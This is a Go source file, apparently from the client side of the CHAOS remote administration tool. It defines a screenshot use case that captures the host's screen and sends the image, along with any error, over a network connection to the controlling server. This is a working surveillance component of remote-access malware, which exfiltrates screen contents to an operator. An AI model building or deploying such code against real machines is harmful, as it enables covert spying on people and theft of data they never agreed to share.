package screenshot

import (
	log "github.com/sirupsen/logrus"
	"github.com/tiagorlampert/CHAOS/client/app/models"
	"github.com/tiagorlampert/CHAOS/client/app/usecase"
	"github.com/tiagorlampert/CHAOS/client/app/util"
	"github.com/tiagorlampert/CHAOS/client/app/util/network"
	"net"
)

type ScreenshotUseCase struct {
	Connection net.Conn
}

func NewScreenshotUseCase(conn net.Conn) usecase.Screenshot {
	return &ScreenshotUseCase{
		Connection: conn,
	}
}

func (s ScreenshotUseCase) TakeScreenshot() {
	var errMsg models.Error
	screenshot, err := util.TakeScreenshot()
	if err != nil {
		log.WithField("cause", err.Error()).Error("error taking screenshot")
		errMsg.HasError = true
		errMsg.Message = err.Error()
	}

	if err := network.Send(s.Connection, models.Message{
		Command: "screenshot",
		Data:    screenshot,
		Error:   errMsg,
	}); err != nil {
		log.WithField("cause", err.Error()).Error("error sending screenshot")
	}
}
